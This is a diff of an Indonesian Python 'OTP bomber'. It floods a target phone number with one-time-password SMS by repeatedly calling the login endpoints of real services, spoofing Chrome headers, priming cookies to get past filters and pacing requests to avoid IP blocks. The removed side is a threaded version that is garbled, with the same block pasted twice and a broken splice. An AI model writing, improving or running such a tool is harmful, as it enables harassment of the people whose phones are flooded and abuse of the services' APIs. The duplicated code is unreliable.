@@ -1,129 +1,46 @@
 import requests
-import threading
 import time
 import random
-from requests.adapters import HTTPAdapter
-from urllib3.util.retry import Retry
 
-class GhostEngine:
-    def __init__(self, target):
-        self.target = target.replace("+62", "0") if target.startswith("+62") else target
-        self.success = 0
-        self.failed = 0
-        
-    def get_session(self):
-        """Membuat sesi palsu agar terlihat seperti Browser asli"""
-        session = requests.Session()
-        retry = Retry(connect=3, backoff_factor=0.5)
-        adapter = HTTPAdapter(max_retries=retry)
-        session.mount('http://', adapter)
-        session.mount('https://', adapter)
-        
-        # Identitas Browser yang sangat lengkap
-        session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
-            'Accept': '*/*',
-            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
-            'Connection': 'keep-alive',
-        })
-        return session
+def brutal_stealth(target):
+    # Format 08xxx
+    num = target.replace("+62", "0") if target.startswith("+62") else target
+    
+    # KUNCI UTAMA: Header yang SANGAT Lengkap (Copy-paste dari Chrome Asli)
+    headers = {
+        'authority': 'dashboard.skillacademy.com',
+        'accept': 'application/json, text/plain, */*',
+        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/json',
+        'origin': 'https://skillacademy.com',
+        'referer': 'https://skillacademy.com/',
+        'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36'
+    }
 
-    def attack(self, api_name):
-        s = self.get_session()
-        try:
-            if api_name == "SKILL":
-                url = "https://dashboard.skillacademy.com/api/v1/auth/otp"
-                json_data = {"phoneNumber": self.target}
-            elif api_name == "MATAHARI":
-                url = "https://api.matahari.com/v1/auth/otp"
-                json_data = {"phone": self.target, "type": "register"}
+    print(f"[*] Mencoba menembus filter untuk {num}...")
+    
+    try:
+        # Pake Session biar ada jejak Cookie
+        with requests.Session() as s:
+            # Pancing dulu biar dapet Cookie
+            s.get("https://skillacademy.com/", headers=headers, timeout=10)
             
-            # Trik: Tambahin jeda milidetik sebelum nembak biar gak tabrakan
-            time.sleep(random.uniform(0.1, 0.9))
-import requests
-import threading
-import time
-import random
-from requests.adapters import HTTPAdapter
-from urllib3.util.retry import Retry
-
-class GhostEngine:
-    def __init__(self, target):
-        self.target = target.replace("+62", "0") if target.startswith("+62") else target
-        self.success = 0
-        self.failed = 0
-        
-    def get_session(self):
-        """Membuat sesi palsu agar terlihat seperti Browser asli"""
-        session = requests.Session()
-        retry = Retry(connect=3, backoff_factor=0.5)
-        adapter = HTTPAdapter(max_retries=retry)
-        session.mount('http://', adapter)
-        session.mount('https://', adapter)
-        
-        # Identitas Browser yang sangat lengkap
-        session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
-            'Accept': '*/*',
-            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
-            'Connection': 'keep-alive',
-        })
-        return session
-
-    def attack(self, api_name):
-        s = self.get_session()
-        try:
-            if api_name == "SKILL":
-                url = "https://dashboard.skillacademy.com/api/v1/auth/otp"
-                json_data = {"phoneNumber": self.target}
-            elif api_name == "MATAHARI":
-                url = "https://api.matahari.com/v1/auth/otp"
-                json_data = {"phone": self.target, "type": "register"}
+            # Baru nembak
+            res = s.post("https://dashboard.skillacademy.com/api/v1/auth/otp", 
+                         json={"phoneNumber": num}, headers=headers, timeout=15)
             
-            # Trik: Tambahin jeda milidetik sebelum nembak biar gak tabrakan
-            time.sleep(random.uniform(0.1, 0.9))
-            
-            res = s.post(url, json=json_data, timeout=15)
             if res.status_code == 200:
-                self.success += 1
-                print(f"[\033[32mSUCCESS\033[0m] {api_name} Meledak!")
+                print("\033[32m[SUCCESS]\033[0m Peluru Tembus!")
             else:
-                self.failed += 1
-                print(f"[\033[31mFAILED\033[0m] {api_name} Diblokir ({res.status_code})")
-        except:
-            self.failed += 1
-            print(f"[\033[33mTIMEOUT\033[0m] Jalur {api_name} Mampet")
+                print(f"\033[31m[FAIL]\033[0m Server Nolak ({res.status_code})")
+    except Exception as e:
+        print(f"\033[33m[TIMEOUT]\033[0m Jaringan diblokir provider.")
 
-# --- Eksekusi ---
 target = input("Target (08xxx): ")
-bot = GhostEngine(target)
 while True:
-    t1 = threading.Thread(target=bot.attack, args=("SKILL",))
-    t2 = threading.Thread(target=bot.attack, args=("MATAHARI",))
-    t1.start()
-    t2.start()
-    # Jeda antar gelombang biar gak kena limit IP
-    time.sleep(12) 
-            
-            res = s.post(url, json=json_data, timeout=15)
-            if res.status_code == 200:
-                self.success += 1
-                print(f"[\033[32mSUCCESS\033[0m] {api_name} Meledak!")
-            else:
-                self.failed += 1
-                print(f"[\033[31mFAILED\033[0m] {api_name} Diblokir ({res.status_code})")
-        except:
-            self.failed += 1
-            print(f"[\033[33mTIMEOUT\033[0m] Jalur {api_name} Mampet")
-
-# --- Eksekusi ---
-target = input("Target (08xxx): ")
-bot = GhostEngine(target)
-while True:
-    t1 = threading.Thread(target=bot.attack, args=("SKILL",))
-    t2 = threading.Thread(target=bot.attack, args=("MATAHARI",))
-    t1.start()
-    t2.start()
-    # Jeda antar gelombang biar gak kena limit IP
-    time.sleep(12) 
-            
+    brutal_stealth(target)
+    # Jeda 15 detik (Wajib, jangan dikurangi biar IP gak hangus)
+    time.sleep(15)
